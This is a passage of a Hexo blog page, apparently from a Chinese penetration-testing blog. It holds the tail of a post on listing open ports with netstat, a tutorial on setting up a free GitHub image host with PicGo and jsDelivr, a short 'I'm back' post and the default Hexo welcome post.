+<h5 id="查看开放端口"><a href="#查看开放端口" class="headerlink" title="查看开放端口"></a>查看开放端口</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -lntp</span><br></pre></td></tr></table></figure>
+
+<p>查看apache2.conf配置文件，找到网站路径</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/13/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%20Github%20%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A%EF%BC%9F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试经验及技巧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/11/13/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%20Github%20%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A%EF%BC%9F/" itemprop="url">如何利用 Github 搭建自己的免费图床</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-13T14:00:15+08:00">
+                2022-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="如何利用-Github-搭建自己的免费图床"><a href="#如何利用-Github-搭建自己的免费图床" class="headerlink" title="如何利用 Github 搭建自己的免费图床"></a>如何利用 Github 搭建自己的免费图床</h2><p>原文出处： <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/69c122f16467">https://www.jianshu.com/p/69c122f16467</a>   </p>
+<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>对于写博客的朋友们来讲，图床这个东西一定不会陌生，而且在一定程度上也给大家造成过一定困扰。</p>
+<p>对于不清楚这个东西的朋友，我就在这儿大概说一下图床是个啥东西。所谓图床，其实可以就相当于我们手机上的相册，不过他是在线的，而且是对大家开放的，大家都可以访问查看，但是编辑删除这些功能仅限于拥有者，就相当于用百度云分享的公开照片，你可以查看，也可以下载下来编辑，但是拥有权还是属于分享者。</p>
+<p>那你可能会疑惑，那这个东西和写博客的我们有啥关系呢？</p>
+<p>你想想，我们写博客，是不是有很多图片需要插入，我们这些博客要保留在本地的时候你可以预览到图片，但一旦你要把它发布到网上，这时候问题来了！发现图片上传失败，那是因为你本地的图片都是存在本地的，平台不会自动给你上传，那这个时候就凸显出图床的重要性了。当然了，如果你是直接在平台进行编辑，那着一点就不用担心了，基本平台都会自动给你上传到它自己的服务器。</p>
+<p>有了图床，我们在本地写好博客之后，就能够任意复制到其他平台，不用担心图片丢失问题了。</p>
+<p>今天的文章就是给大家分享一个搭建免费图床的教程，既是方便自己后续的复习，也希望对大家也有所帮助。</p>
+<h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2. 准备工作"></a>2. 准备工作</h2><p>那么在正式开始之前，你需要提前准备以下东西：</p>
+<blockquote>
+<p>一个 Github 账号</p>
+</blockquote>
+<p>好了，就这么简单，只要你有一个 Github 账号就够了，你就能拥有一个免费的图床了，如果你还没有，那赶紧去 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/cunyu1943">注册</a> 一个账号吧。</p>
+<h2 id="3-搭建过程"><a href="#3-搭建过程" class="headerlink" title="3. 搭建过程"></a>3. 搭建过程</h2><p>这一部分就是正式开始大家过程了，准备好大干一场吧！</p>
+<ol>
+<li>登录你的 Github 之后，创建一个新的仓库；</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-7f3253ac4371cbe0.png"></p>
+<p>image</p>
+<ol start="2">
+<li>填写仓库先关资料，一般只需要选一个合适的仓库名，然后确保仓库为 <code>public</code> 其他的保持默认就好；</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-645cd4da27fd3def.png"></p>
+<p>image</p>
+<ol start="3">
+<li>一般创建成功之后，会出现如下界面，至此，我们的图床算是创建好了，接下来就是如何上传图片了；</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-60f70a4e08d83a6b.png"></p>
+<p>image</p>
+<h2 id="4-上传图片"><a href="#4-上传图片" class="headerlink" title="4. 上传图片"></a>4. 上传图片</h2><p>通过上面的步骤，我们的图床时搭建好了，但是通过传统的方法向 Github 上传图片太麻烦了，这里我们推荐使用一个开源图床工具 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://molunerfinn.com/PicGo/">PicGo</a> 来作为我们的图片上传工具；</p>
+<p>PicGo 的安装就不说了，去他的 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://molunerfinn.com/PicGo/">官网</a> 下载对应版本进行安装即可，我们主要讲讲如何用它来上传图片。安装后，打开软件其主页面如下：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-d9490d2272e0bdb9.png"></p>
+<p>image</p>
+<p>接下来就是配置 PicGo 的过程了。</p>
+<ol>
+<li>首先，我们先要去 Github 创建一个 token；</li>
+</ol>
+<p>以此打开 <code>Settings -&gt; Developer settings -&gt; Personal access tokens</code>，最后点击 <code>generate new token</code>；</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-c1d486ece505b9ba.png"></p>
+<p>image</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-a822eb96213d4855.png"></p>
+<p>image</p>
+<ol start="2">
+<li>填写及勾选相关信息，然后点击 <code>Genetate token</code> 即可；</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-00d62505da9a1a2d.png"></p>
+<p>image</p>
+<ol start="3">
+<li><code>token</code> 生成，注意它只会显示一次，所以你最好把它复制下来到你的备忘录存好，方便下次使用，否则下次有需要重新新建；</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-efb266154606a91e.png"></p>
+<p>image</p>
+<ol start="4">
+<li>配置 PicGo，依次打开 图床设置 -&gt; Github 图床；</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-a8a11b2d49dee3c3.png"></p>
+<ol start="5">
+<li>填写相关信息，最后点击 <code>确定</code>即可，要将其作为默认图床的话，点击设为默认图床；</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-3f1bb8f438b144c5.png"></p>
+<p>image</p>
+<ol start="6">
+<li>上传图片，通过上传区上传即可（Ctrl V 或者将图片拖拽都可以），也可以通过快捷键的方式上传（默认上传键为 <code>Ctrl + Shift + P</code>）；</li>
+</ol>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-af409ed4a4fcd285.png"></p>
+<p>image</p>
+<h2 id="5-加速访问"><a href="#5-加速访问" class="headerlink" title="5. 加速访问"></a>5. 加速访问</h2><p>大家可能会发现，我们上传到 Github 的图片有时候访问太慢了，有时候甚至直接加载不出来！那该咋办呢？</p>
+<p>这时候我们就可以用 <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.jsdelivr.com/">jsDelivr</a> 进行免费加速，而设置的方法也很简单，只需要在我们 PicGo 图床配置中添加如下自定义域名即可；</p>
+<blockquote>
+<p><code>https://cdn.jsdelivr.net/gh/用户名/仓库名</code></p>
+</blockquote>
+<p>比如我的就是 <code>https://cdn.jsdelivr.net/gh/cunyu1943/blog-imgs</code></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-c1a81fd6ecaf7acf.png"></p>
+<p>image</p>
+<h2 id="6-图床推荐"><a href="#6-图床推荐" class="headerlink" title="6. 图床推荐"></a>6. 图床推荐</h2><p>除开用 Github 搭建的方式之后，我们也可以用 Gitee 进行搭建，搭建方式和本文大致相同。此外，我也推荐几个免费的图床给大家，大家可以根据自己的喜好进行选择；</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://imgchr.com/">路过图床</a></li>
+<li><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://sm.ms/">SM.MS</a></li>
+<li><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://imgur.com/">Imgur</a></li>
+</ol>
+<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>至此，我们的搭建免费图床的教程就到此结束了，总结一下主要有如下几部分：</p>
+<ol>
+<li>准备一个 Github 账号；</li>
+<li>搭建图床仓库；</li>
+<li>上传图片设置；</li>
+<li>加速访问；</li>
+<li>免费图床推荐；</li>
+</ol>
+<p>如果你对上面的部分有疑问，欢迎留言或者私信，我会在看到的第一时间回复你！</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/25592958-048b89fb1135d894.png"></p>
+<p>image</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/13/%E6%88%91%E5%9B%9E%E6%9D%A5%E4%BA%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试经验及技巧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/11/13/%E6%88%91%E5%9B%9E%E6%9D%A5%E4%BA%86/" itemprop="url">我回来了</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-13T13:41:13+08:00">
+                2022-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>好久不见，还是觉得hexo最好。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shentoux.github.io/2022/11/12/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试经验及技巧">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/11/12/hello-world/" itemprop="url">Hello World</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-11-12T20:46:33+08:00">
+                2022-11-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
